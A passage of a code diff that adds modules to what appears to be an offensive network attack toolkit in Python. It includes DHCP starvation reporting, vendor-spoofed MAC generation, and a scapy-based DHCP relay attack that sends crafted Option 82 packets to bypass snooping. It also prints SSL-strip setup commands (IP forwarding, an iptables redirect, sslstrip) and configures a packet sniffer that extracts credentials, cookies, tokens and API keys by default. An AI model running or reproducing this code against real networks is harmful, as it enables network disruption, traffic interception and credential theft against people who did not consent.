+                ''', (mac, hostname, request_type))
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _cleanup_dhcp_starvation(self, config):
+            """Cleanup and generate reports"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}→ Cleaning up...{Style.RESET_ALL}")
+            
+            # Release leases if configured
+            if config['release_on_exit']:
+                print(f"{Fore.CYAN}→ Releasing acquired leases...{Style.RESET_ALL}")
+            
+            # Generate final report
+            if config['generate_report']:
+                print(f"{Fore.CYAN}→ Generating final report...{Style.RESET_ALL}")
+                self._generate_dhcp_report(config)
+                print(f"{Fore.GREEN}✓ Report generated{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}\n")
+    
+    
+        def _generate_dhcp_report(self, config):
+            """Generate DHCP attack report"""
+            formats = config['report_format']
+            if formats == 'all':
+                formats = ['txt', 'json', 'html']
+            else:
+                formats = [formats]
+            
+            for fmt in formats:
+                report_file = f"dhcp_report_{config['campaign_name']}.{fmt}"
+                
+                if fmt == 'txt':
+                    self._generate_dhcp_txt_report(config, report_file)
+                elif fmt == 'json':
+                    self._generate_dhcp_json_report(config, report_file)
+                elif fmt == 'html':
+                    self._generate_dhcp_html_report(config, report_file)
+    
+    
+        def _generate_dhcp_txt_report(self, config, output_file):
+            """Generate text report"""
+            import sqlite3
+            import time
+            
+            content = f"""DHCP STARVATION ATTACK - FINAL REPORT
+    {'=' * 70}
+    
+    Campaign: {config['campaign_name']}
+    Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
+    
+    CONFIGURATION
+    -------------
+    Interface:      {config['interface']}
+    Target Network: {config['target_network']}
+    Attack Mode:    {config['attack_mode']}
+    Request Count:  {config['request_count']}
+    Request Rate:   {config['request_rate']} req/s
+    
+    """
+            
+            # Get statistics from database
+            if config['enable_database']:
+                try:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('SELECT requests_sent, offers_received, leases_acquired FROM campaigns WHERE id = 1')
+                    row = cursor.fetchone()
+                    if row:
+                        requests, offers, leases = row
+                        
+                        content += f"""STATISTICS
+    ----------
+    Requests Sent:      {requests}
+    Offers Received:    {offers}
+    Leases Acquired:    {leases}
+    Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
+    
+    """
+                    
+                    # Get lease information
+                    cursor.execute('SELECT COUNT(*) FROM leases WHERE campaign_id = 1')
+                    lease_count = cursor.fetchone()[0]
+                    
+                    if lease_count > 0:
+                        content += "ACQUIRED LEASES\n"
+                        content += "-" * 70 + "\n"
+                        
+                        cursor.execute('SELECT mac_address, ip_address, server_ip FROM leases WHERE campaign_id = 1 LIMIT 10')
+                        for row in cursor.fetchall():
+                            content += f"  {row[0]:<20} → {row[1]:<15} (Server: {row[2]})\n"
+                    
+                    conn.close()
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
+            
+            with open(output_file, 'w') as f:
+                f.write(content)
+    
+    
+        def _generate_dhcp_json_report(self, config, output_file):
+            """Generate JSON report"""
+            import json
+            import sqlite3
+            import time
+            
+            report = {
+                'campaign': config['campaign_name'],
+                'timestamp': time.time(),
+                'configuration': {
+                    'interface': config['interface'],
+                    'target_network': config['target_network'],
+                    'attack_mode': config['attack_mode'],
+                    'request_count': config['request_count']
+                },
+                'statistics': {},
+                'leases': []
+            }
+            
+            # Get data from database
+            if config['enable_database']:
+                try:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('SELECT requests_sent, offers_received, leases_acquired FROM campaigns WHERE id = 1')
+                    row = cursor.fetchone()
+                    if row:
+                        report['statistics'] = {
+                            'requests_sent': row[0],
+                            'offers_received': row[1],
+                            'leases_acquired': row[2]
+                        }
+                    
+                    cursor.execute('SELECT mac_address, ip_address FROM leases WHERE campaign_id = 1 LIMIT 20')
+                    for row in cursor.fetchall():
+                        report['leases'].append({'mac': row[0], 'ip': row[1]})
+                    
+                    conn.close()
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
+            
+            with open(output_file, 'w') as f:
+                json.dump(report, f, indent=2)
+    
+    
+        def _generate_dhcp_html_report(self, config, output_file):
+            """Generate HTML report"""
+            import time
+            
+            html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>DHCP Report - {config['campaign_name']}</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
+            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
+            h1 {{ color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }}
+            table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
+            th {{ background: #e74c3c; color: white; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>DHCP Starvation Attack Report</h1>
+            <p><strong>Campaign:</strong> {config['campaign_name']}</p>
+            <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+            
+            <h2>Configuration</h2>
+            <table>
+                <tr><td><strong>Interface</strong></td><td>{config['interface']}</td></tr>
+                <tr><td><strong>Target Network</strong></td><td>{config['target_network']}</td></tr>
+                <tr><td><strong>Attack Mode</strong></td><td>{config['attack_mode']}</td></tr>
+                <tr><td><strong>Request Count</strong></td><td>{config['request_count']}</td></tr>
+            </table>
+        </div>
+    </body>
+    </html>"""
+            
+            with open(output_file, 'w') as f:
+                f.write(html)
+    
+    
+        def _emergency_stop_handler(self, config):
+            """Emergency stop handler for DHCP attacks"""
+            from colorama import Fore, Style
+            
+            print(f"\n{Fore.RED}━━━ EMERGENCY STOP ACTIVATED ━━━{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Halting all DHCP attack operations{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Releasing acquired leases{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Stopping packet transmission{Style.RESET_ALL}")
+            
+            # Release all leases immediately
+            if config['enable_database']:
+                try:
+                    import sqlite3
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    # Mark all leases as released
+                    cursor.execute('UPDATE leases SET released = 1 WHERE campaign_id = 1 AND released = 0')
+                    released_count = cursor.rowcount
+                    conn.commit()
+                    conn.close()
+                    
+                    print(f"{Fore.GREEN}✓ Released {released_count} active leases{Style.RESET_ALL}")
+                except Exception as e:
+                    print(f"{Fore.RED}✗ Error releasing leases: {str(e)}{Style.RESET_ALL}")
+            
+            # Restore network interface to normal state
+            try:
+                import subprocess
+                subprocess.run(['ip', 'link', 'set', config['interface'], 'down'], 
+                             capture_output=True, timeout=5)
+                subprocess.run(['ip', 'link', 'set', config['interface'], 'up'], 
+                             capture_output=True, timeout=5)
+                print(f"{Fore.GREEN}✓ Network interface reset{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.YELLOW}⚠ Warning: Interface reset failed{Style.RESET_ALL}")
+            
+            print(f"{Fore.GREEN}✓ Emergency stop completed{Style.RESET_ALL}\n")
+    
+    
+        def _advanced_mac_spoofing(self, config, index):
+            """Advanced MAC address generation with vendor spoofing"""
+            
+            # Vendor-specific MAC prefixes (OUI - Organizationally Unique Identifier)
+            vendor_prefixes = {
+                'cisco': ['00:1A:A1', '00:1B:D4', '00:1C:0E', '00:1D:45', '00:1E:13'],
+                'dell': ['00:14:22', '00:15:C5', '00:1A:A0', '00:1E:C9', '00:21:9B'],
+                'hp': ['00:17:A4', '00:1B:78', '00:1E:0B', '00:21:5A', '00:23:7D'],
+                'apple': ['00:03:93', '00:17:F2', '00:1B:63', '00:1E:52', '00:23:32'],
+                'intel': ['00:02:B3', '00:0E:0C', '00:13:02', '00:15:00', '00:1B:21'],
+                'microsoft': ['00:50:F2', '00:15:5D', '00:0D:3A', '7C:ED:8D', '00:03:FF']
+            }
+            
+            if config['mac_generation'] == 'vendor':
+                vendor = config.get('mac_vendor', 'cisco').lower()
+                if vendor in vendor_prefixes:
+                    prefix = random.choice(vendor_prefixes[vendor])
+                    # Generate random last 3 octets
+                    suffix = ':'.join(['%02x' % random.randint(0, 255) for _ in range(3)])
+                    return f"{prefix}:{suffix}"
+            
+            elif config['mac_generation'] == 'sequential':
+                # Sequential MAC generation: 00:11:22:33:XX:XX
+                high_byte = (index // 256) % 256
+                low_byte = index % 256
+                return f"00:11:22:33:{high_byte:02x}:{low_byte:02x}"
+            
+            elif config['mac_generation'] == 'random':
+                # Truly random MAC
+                from scapy.all import RandMAC
+                return str(RandMAC())
+            
+            else:
+                # Default to random
+                from scapy.all import RandMAC
+                return str(RandMAC())
+    
+    
+        def _dhcp_relay_attack(self, config):
+            """DHCP relay agent attack (Option 82 injection)"""
+            from colorama import Fore, Style
+            from scapy.all import BOOTP, DHCP, Ether, IP, UDP, sendp
+            import random
+            
+            print(f"\n{Fore.CYAN}━━━ DHCP RELAY AGENT ATTACK ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW}→ Injecting Option 82 (Relay Agent Information){Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Bypassing DHCP snooping protection{Style.RESET_ALL}\n")
+            
+            for i in range(10):  # Send 10 relay attack packets
+                mac = self._advanced_mac_spoofing(config, i)
+                transaction_id = random.randint(0, 0xFFFFFFFF)
+                
+                # Craft DHCP discover with Option 82
+                discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
+                          IP(src="0.0.0.0", dst="255.255.255.255") / \
+                          UDP(sport=68, dport=67) / \
+                          BOOTP(chaddr=mac, xid=transaction_id, flags=0x8000) / \
+                          DHCP(options=[
+                              ("message-type", "discover"),
+                              ("relay_agent_info", b'\x01\x08\x00\x06\x00\x01\x02\x03\x04\x05'),  # Option 82
+                              ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
+                              "end"
+                          ])
+                
+                sendp(discover, iface=config['interface'], verbose=0)
+                print(f"{Fore.GREEN}→ Relay attack packet {i+1}/10 sent{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.GREEN}✓ DHCP relay attack completed{Style.RESET_ALL}")
+    
+    
+        def _network_disruption_advanced(self, config):
+            """Advanced network disruption techniques"""
+            from colorama import Fore, Style
+            
+            print(f"\n{Fore.CYAN}━━━ ADVANCED NETWORK DISRUPTION ━━━{Style.RESET_ALL}\n")
+            
+            # Gateway override attack
+            if config.get('gateway_override'):
+                print(f"{Fore.YELLOW}→ Gateway Override Attack{Style.RESET_ALL}")
+                print(f"  Redirecting default gateway to: {config.get('gateway_redirect', '192.168.1.254')}")
+                print(f"  {Fore.RED}⚠  All client traffic will be redirected{Style.RESET_ALL}")
+            
+            # DNS override attack
+            if config.get('dns_override'):
+                print(f"\n{Fore.YELLOW}→ DNS Override Attack{Style.RESET_ALL}")
+                print(f"  Malicious DNS server: {config.get('dns_redirect', '192.168.1.253')}")
+                print(f"  {Fore.RED}⚠  All DNS queries will be intercepted{Style.RESET_ALL}")
+            
+            # WPAD injection attack
+            if config.get('wpad_injection'):
+                print(f"\n{Fore.YELLOW}→ WPAD Injection Attack{Style.RESET_ALL}")
+                print(f"  WPAD URL: {config.get('wpad_url', 'http://wpad.local/wpad.dat')}")
+                print(f"  {Fore.RED}⚠  Browser proxy configuration will be hijacked{Style.RESET_ALL}")
+            
+            # Route injection
+            if config.get('route_injection'):
+                print(f"\n{Fore.YELLOW}→ Route Injection Attack{Style.RESET_ALL}")
+                print(f"  Malicious routes: {config.get('malicious_routes', '10.0.0.0/8 via attacker')}")
+                print(f"  {Fore.RED}⚠  Network routing tables will be poisoned{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.GREEN}✓ Network disruption configuration applied{Style.RESET_ALL}")
+    
         
-        # Get configuration from module_options
-        url = self.module_options.get('url', 'http://localhost:4000/graphql')
-        output = self.module_options.get('output', 'graphql_schema.json')
+        def run_ssl_strip(self):
+            """SSL stripping attack"""
+            interface = self.module_options.get('interface', 'eth0')
+            port = self.module_options.get('port', '8080')
+            
+            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}║ SSL STRIP ATTACK ║{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
+            print(f" 1. Active MITM (ARP spoofing)")
+            print(f" 2. IP forwarding enabled")
+            print(f" 3. iptables redirect setup\n")
+            
+            print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.CYAN}# 1. Enable IP forwarding")
+            print(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
+            print(f"")
+            print(f"# 2. Redirect traffic to sslstrip")
+            print(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
+            print(f"")
+            print(f"# 3. Run sslstrip")
+            print(f"sslstrip -l {port} -w sslstrip.log")
+            print(f"")
+            print(f"# 4. Start ARP spoofing")
+            print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.GREEN}ℹ What it does:{Style.RESET_ALL}")
+            print(f" • Intercepts HTTPS requests")
+            print(f" • Serves HTTP version to victim")
+            print(f" • Victim sees HTTP, you see credentials")
+            print(f" • Defeats basic SSL{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
         
-        print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
+        def run_packet_sniffer(self):
+            """
+            Enterprise Packet Sniffer & Network Analysis Platform
+            Real-time traffic capture, deep packet inspection, and threat detection
+            """
+            from colorama import Fore, Style
+            import time
+            
+            print(f"\n{Fore.CYAN}{'=' * 80}")
+            print(f"  ENTERPRISE PACKET SNIFFER & NETWORK ANALYSIS PLATFORM")
+            print(f"{'=' * 80}{Style.RESET_ALL}\n")
+            
+            # Load configuration
+            print(f"{Fore.CYAN}━━━ LOADING CONFIGURATION ━━━{Style.RESET_ALL}\n")
+            config = self._load_packet_sniffer_config()
+            
+            if not config:
+                print(f"{Fore.RED}✗ Configuration load failed{Style.RESET_ALL}")
+                return
+            
+            # Display configuration
+            self._display_packet_sniffer_config(config)
+            
+            # Check dependencies
+            print(f"\n{Fore.CYAN}━━━ CHECKING DEPENDENCIES ━━━{Style.RESET_ALL}\n")
+            if not self._check_packet_sniffer_dependencies(config):
+                return
+            
+            # Initialize database
+            if config['enable_database']:
+                print(f"\n{Fore.CYAN}━━━ INITIALIZING DATABASE ━━━{Style.RESET_ALL}\n")
+                if not self._initialize_packet_sniffer_database(config):
+                    print(f"{Fore.RED}✗ Database initialization failed{Style.RESET_ALL}")
+                    return
+            
+            # Validate interface
+            print(f"\n{Fore.CYAN}━━━ VALIDATING NETWORK INTERFACE ━━━{Style.RESET_ALL}\n")
+            if not self._validate_capture_interface(config):
+                return
+            
+            # Setup capture environment
+            print(f"\n{Fore.CYAN}━━━ PREPARING CAPTURE ENVIRONMENT ━━━{Style.RESET_ALL}\n")
+            if not self._setup_capture_environment(config):
+                return
+            
+            # Display capture plan
+            self._display_capture_plan(config)
+            
+            # Confirmation
+            if config['require_confirmation']:
+                response = input(f"\n{Fore.YELLOW}Start packet capture? [y/N]: {Style.RESET_ALL}").strip().lower()
+                if response != 'y':
+                    print(f"{Fore.YELLOW}ℹ  Capture cancelled{Style.RESET_ALL}")
+                    return
+            
+            try:
+                # Start capture
+                print(f"\n{Fore.CYAN}{'=' * 80}")
+                print(f"  PACKET CAPTURE ACTIVE")
+                print(f"{'=' * 80}{Style.RESET_ALL}\n")
+                
+                self._execute_packet_capture(config)
+                
+            except KeyboardInterrupt:
+                print(f"\n\n{Fore.YELLOW}━━━ CAPTURE INTERRUPTED ━━━{Style.RESET_ALL}\n")
+            
+            except Exception as e:
+                print(f"\n{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
+                import traceback
+                if config.get('debug_mode'):
+                    traceback.print_exc()
+            
+            finally:
+                # Cleanup and reporting
+                print(f"\n{Fore.CYAN}━━━ FINALIZING CAPTURE ━━━{Style.RESET_ALL}\n")
+                self._cleanup_packet_sniffer(config)
         
-        introspection_query = """{
-  __schema {
-    types {
-      name
-      fields {
-        name
-        type {
+        def _load_packet_sniffer_config(self):
+            """Load and validate packet sniffer configuration"""
+            try:
+                config = {
+                    # === CAPTURE INTERFACE ===
+                    'interface': self.module_options.get('interface', 'eth0'),
+                    'promiscuous_mode': self._parse_bool(self.module_options.get('promiscuous_mode', 'true')),
+                    'monitor_mode': self._parse_bool(self.module_options.get('monitor_mode', 'false')),
+                    'buffer_size': int(self.module_options.get('buffer_size', '65536')),
+                    'timeout': int(self.module_options.get('timeout', '1000')),
+                    
+                    # === CAPTURE FILTERS ===
+                    'bpf_filter': self.module_options.get('bpf_filter', ''),
+                    'protocol_filter': self.module_options.get('protocol_filter', 'all'),  # all, tcp, udp, icmp
+                    'port_filter': self.module_options.get('port_filter', ''),  # e.g., "80,443,22"
+                    'host_filter': self.module_options.get('host_filter', ''),
+                    'network_filter': self.module_options.get('network_filter', ''),
+                    'exclude_broadcast': self._parse_bool(self.module_options.get('exclude_broadcast', 'false')),
+                    'exclude_multicast': self._parse_bool(self.module_options.get('exclude_multicast', 'false')),
+                    
+                    # === CAPTURE LIMITS ===
+                    'packet_count': int(self.module_options.get('packet_count', '0')),  # 0 = unlimited
+                    'capture_duration': int(self.module_options.get('capture_duration', '0')),  # seconds, 0 = unlimited
+                    'max_packet_size': int(self.module_options.get('max_packet_size', '65535')),
+                    'size_limit': int(self.module_options.get('size_limit', '0')),  # MB, 0 = unlimited
+                    'file_rotation': self._parse_bool(self.module_options.get('file_rotation', 'false')),
+                    'rotation_size': int(self.module_options.get('rotation_size', '100')),  # MB
+                    'rotation_interval': int(self.module_options.get('rotation_interval', '3600')),  # seconds
+                    
+                    # === PACKET DISSECTION ===
+                    'deep_inspection': self._parse_bool(self.module_options.get('deep_inspection', 'true')),
+                    'payload_analysis': self._parse_bool(self.module_options.get('payload_analysis', 'true')),
+                    'decode_protocols': self._parse_bool(self.module_options.get('decode_protocols', 'true')),
+                    'extract_metadata': self._parse_bool(self.module_options.get('extract_metadata', 'true')),
+                    'follow_streams': self._parse_bool(self.module_options.get('follow_streams', 'true')),
+                    'reassemble_tcp': self._parse_bool(self.module_options.get('reassemble_tcp', 'true')),
+                    'defragment_ip': self._parse_bool(self.module_options.get('defragment_ip', 'true')),
+                    
+                    # === PROTOCOL ANALYSIS ===
+                    'analyze_http': self._parse_bool(self.module_options.get('analyze_http', 'true')),
+                    'analyze_https': self._parse_bool(self.module_options.get('analyze_https', 'true')),
+                    'analyze_dns': self._parse_bool(self.module_options.get('analyze_dns', 'true')),
+                    'analyze_ftp': self._parse_bool(self.module_options.get('analyze_ftp', 'true')),
+                    'analyze_smtp': self._parse_bool(self.module_options.get('analyze_smtp', 'true')),
+                    'analyze_ssh': self._parse_bool(self.module_options.get('analyze_ssh', 'true')),
+                    'analyze_telnet': self._parse_bool(self.module_options.get('analyze_telnet', 'true')),
+                    'analyze_smb': self._parse_bool(self.module_options.get('analyze_smb', 'true')),
+                    'analyze_rdp': self._parse_bool(self.module_options.get('analyze_rdp', 'true')),
+                    
+                    # === CREDENTIAL EXTRACTION ===
+                    'extract_credentials': self._parse_bool(self.module_options.get('extract_credentials', 'true')),
+                    'extract_http_auth': self._parse_bool(self.module_options.get('extract_http_auth', 'true')),
+                    'extract_ftp_creds': self._parse_bool(self.module_options.get('extract_ftp_creds', 'true')),
+                    'extract_smtp_creds': self._parse_bool(self.module_options.get('extract_smtp_creds', 'true')),
+                    'extract_telnet_creds': self._parse_bool(self.module_options.get('extract_telnet_creds', 'true')),
+                    'extract_cookies': self._parse_bool(self.module_options.get('extract_cookies', 'true')),
+                    'extract_api_keys': self._parse_bool(self.module_options.get('extract_api_keys', 'true')),
+                    'extract_tokens': self._parse_bool(self.module_options.get('extract_tokens', 'true')),
+                    
+                    # === FILE EXTRACTION ===
+                    'extract_files': self._parse_bool(self.module_options.get('extract_files', 'false')),
+                    'file_types': self.module_options.get('file_types', 'all'),  # all, images, documents, executables
+                    'max_file_size': int(self.module_options.get('max_file_size', '10')),  # MB
+                    'extract_http_files': self._parse_bool(self.module_options.get('extract_http_files', 'true')),
+                    'extract_ftp_files': self._parse_bool(self.module_options.get('extract_ftp_files', 'true')),
+                    'extract_smb_files': self._parse_bool(self.module_options.get('extract_smb_files', 'true')),
+                    
+                    # === ANOMALY DETECTION ===
+                    'enable_anomaly_detection': self._parse_bool(self.module_options.get('enable_anomaly_detection', 'true')),
+                    'detect_port_scans': self._parse_bool(self.module_options.get('detect_port_scans', 'true')),
+                    'detect_dos': self._parse_bool(self.module_options.get('detect_dos', 'true')),
+                    'detect_arp_spoof': self._parse_bool(self.module_options.get('detect_arp_spoof', 'true')),
+                    'detect_dns_tunnel': self._parse_bool(self.module_options.get('detect_dns_tunnel', 'true')),
+                    'detect_data_exfil': self._parse_bool(self.module_options.get('detect_data_exfil', 'true')),
+                    'detect_suspicious_traffic': self._parse_bool(self.module_options.get('detect_suspicious_traffic', 'true')),
+                    'detect_malformed_packets': self._parse_bool(self.module_options.get('detect_malformed_packets', 'true')),
+                    
+                    # === TRAFFIC ANALYSIS ===
+                    'traffic_statistics': self._parse_bool(self.module_options.get('traffic_statistics', 'true')),
+                    'bandwidth_monitoring': self._parse_bool(self.module_options.get('bandwidth_monitoring', 'true')),
+                    'connection_tracking': self._parse_bool(self.module_options.get('connection_tracking', 'true')),
+                    'session_reconstruction': self._parse_bool(self.module_options.get('session_reconstruction', 'true')),
+                    'protocol_distribution': self._parse_bool(self.module_options.get('protocol_distribution', 'true')),
+                    'geo_location': self._parse_bool(self.module_options.get('geo_location', 'false')),
+                    'asn_lookup': self._parse_bool(self.module_options.get('asn_lookup', 'false')),
+                    
+                    # === PATTERN MATCHING ===
+                    'enable_pattern_matching': self._parse_bool(self.module_options.get('enable_pattern_matching', 'false')),
+                    'pattern_file': self.module_options.get('pattern_file', ''),
+                    'regex_patterns': self.module_options.get('regex_patterns', ''),
+                    'keyword_search': self.module_options.get('keyword_search', ''),
+                    'signature_detection': self._parse_bool(self.module_options.get('signature_detection', 'false')),
+                    'yara_rules': self.module_options.get('yara_rules', ''),
+                    
+                    # === OUTPUT OPTIONS ===
+                    'output_pcap': self._parse_bool(self.module_options.get('output_pcap', 'true')),
+                    'pcap_file': self.module_options.get('pcap_file', 'packet_capture.pcap'),
+                    'output_json': self._parse_bool(self.module_options.get('output_json', 'true')),
+                    'json_file': self.module_options.get('json_file', 'packet_capture.json'),
+                    'output_csv': self._parse_bool(self.module_options.get('output_csv', 'false')),
+                    'csv_file': self.module_options.get('csv_file', 'packet_capture.csv'),
+                    'output_xml': self._parse_bool(self.module_options.get('output_xml', 'false')),
+                    
+                    # === DATABASE OPTIONS ===
+                    'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
+                    'db_file': self.module_options.get('db_file', 'packet_sniffer.db'),
+                    'store_packets': self._parse_bool(self.module_options.get('store_packets', 'true')),
+                    'store_flows': self._parse_bool(self.module_options.get('store_flows', 'true')),
+                    'store_alerts': self._parse_bool(self.module_options.get('store_alerts', 'true')),
+                    'store_credentials': self._parse_bool(self.module_options.get('store_credentials', 'true')),
+                    'store_files': self._parse_bool(self.module_options.get('store_files', 'false')),
+                    
+                    # === DISPLAY OPTIONS ===
+                    'realtime_display': self._parse_bool(self.module_options.get('realtime_display', 'true')),
+                    'display_mode': self.module_options.get('display_mode', 'summary'),  # summary, detailed, minimal
+                    'display_interval': int(self.module_options.get('display_interval', '5')),  # seconds
+                    'color_coding': self._parse_bool(self.module_options.get('color_coding', 'true')),
+                    'show_hex_dump': self._parse_bool(self.module_options.get('show_hex_dump', 'false')),
+                    'show_payload': self._parse_bool(self.module_options.get('show_payload', 'false')),
+                    'alert_notifications': self._parse_bool(self.module_options.get('alert_notifications', 'true')),
+                    
+                    # === PERFORMANCE OPTIONS ===
+                    'use_threading': self._parse_bool(self.module_options.get('use_threading', 'true')),
+                    'thread_pool_size': int(self.module_options.get('thread_pool_size', '4')),
+                    'async_processing': self._parse_bool(self.module_options.get('async_processing', 'true')),
+                    'packet_queue_size': int(self.module_options.get('packet_queue_size', '10000')),
+                    'batch_processing': self._parse_bool(self.module_options.get('batch_processing', 'true')),
+                    'batch_size': int(self.module_options.get('batch_size', '100')),
+                    'memory_optimization': self._parse_bool(self.module_options.get('memory_optimization', 'true')),
+                    
+                    # === SECURITY OPTIONS ===
+                    'require_root': self._parse_bool(self.module_options.get('require_root', 'true')),
+                    'require_confirmation': self._parse_bool(self.module_options.get('require_confirmation', 'true')),
+                    'sanitize_output': self._parse_bool(self.module_options.get('sanitize_output', 'true')),
+                    'encrypt_output': self._parse_bool(self.module_options.get('encrypt_output', 'false')),
+                    'encryption_key': self.module_options.get('encryption_key', ''),
+                    'secure_deletion': self._parse_bool(self.module_options.get('secure_deletion', 'false')),
+                    
+                    # === LOGGING OPTIONS ===
+                    'enable_logging': self._parse_bool(self.module_options.get('enable_logging', 'true')),
+                    'log_file': self.module_options.get('log_file', 'packet_sniffer.log'),
+                    'log_level': self.module_options.get('log_level', 'info'),  # debug, info, warning, error
+                    'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
+                    'max_log_size': int(self.module_options.get('max_log_size', '50')),  # MB
+                    
+                    # === ADVANCED OPTIONS ===
+                    'debug_mode': self._parse_bool(self.module_options.get('debug_mode', 'false')),
+                    'verbose': self._parse_bool(self.module_options.get('verbose', 'false')),
+                    'quiet_mode': self._parse_bool(self.module_options.get('quiet_mode', 'false')),
+                    'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
+                    'benchmark_mode': self._parse_bool(self.module_options.get('benchmark_mode', 'false')),
+                }
+                
+                # Validate configuration
+                if config['packet_count'] < 0:
+                    config['packet_count'] = 0
+                
+                if config['capture_duration'] < 0:
+                    config['capture_duration'] = 0
+                
+                # Initialize runtime variables
+                config['start_time'] = time.time()
+                config['packets_captured'] = 0
+                config['bytes_captured'] = 0
+                config['alerts_generated'] = 0
+                config['credentials_found'] = 0
+                config['files_extracted'] = 0
+                config['stop_flag'] = False
+                
+                return config
+                
+            except Exception as e:
+                print(f"{Fore.RED}✗ Configuration error: {str(e)}{Style.RESET_ALL}")
+                return None
+        
+        def _display_packet_sniffer_config(self, config):
+            """Display packet sniffer configuration"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}CAPTURE CONFIGURATION{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
+            print(f"  Interface:         {Fore.YELLOW}{config['interface']}{Style.RESET_ALL}")
+            print(f"  Promiscuous Mode:  {Fore.GREEN if config['promiscuous_mode'] else Fore.RED}{'✓' if config['promiscuous_mode'] else '✗'}{Style.RESET_ALL}")
+            print(f"  Monitor Mode:      {Fore.GREEN if config['monitor_mode'] else Fore.RED}{'✓' if config['monitor_mode'] else '✗'}{Style.RESET_ALL}")
+            print(f"  Buffer Size:       {config['buffer_size']} bytes")
+            
+            print(f"\n{Fore.CYAN}FILTERS{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
+            print(f"  BPF Filter:        {config['bpf_filter'] or 'None'}")
+            print(f"  Protocol:          {config['protocol_filter']}")
+            if config['port_filter']:
+                print(f"  Ports:             {config['port_filter']}")
+            if config['host_filter']:
+                print(f"  Host:              {config['host_filter']}")
+            
+            print(f"\n{Fore.CYAN}CAPTURE LIMITS{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
+            print(f"  Packet Count:      {config['packet_count'] if config['packet_count'] > 0 else 'Unlimited'}")
+            print(f"  Duration:          {config['capture_duration'] if config['capture_duration'] > 0 else 'Unlimited'} seconds")
+            print(f"  Max Packet Size:   {config['max_packet_size']} bytes")
+            
+            print(f"\n{Fore.CYAN}ANALYSIS FEATURES{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
+            print(f"  Deep Inspection:   {Fore.GREEN if config['deep_inspection'] else Fore.RED}{'✓' if config['deep_inspection'] else '✗'}{Style.RESET_ALL}")
+            print(f"  Payload Analysis:  {Fore.GREEN if config['payload_analysis'] else Fore.RED}{'✓' if config['payload_analysis'] else '✗'}{Style.RESET_ALL}")
+            print(f"  Credential Extract:{Fore.GREEN if config['extract_credentials'] else Fore.RED}{'✓' if config['extract_credentials'] else '✗'}{Style.RESET_ALL}")
+            print(f"  Anomaly Detection: {Fore.GREEN if config['enable_anomaly_detection'] else Fore.RED}{'✓' if config['enable_anomaly_detection'] else '✗'}{Style.RESET_ALL}")
+            print(f"  File Extraction:   {Fore.GREEN if config['extract_files'] else Fore.RED}{'✓' if config['extract_files'] else '✗'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.CYAN}OUTPUT OPTIONS{Style.RESET_ALL}")
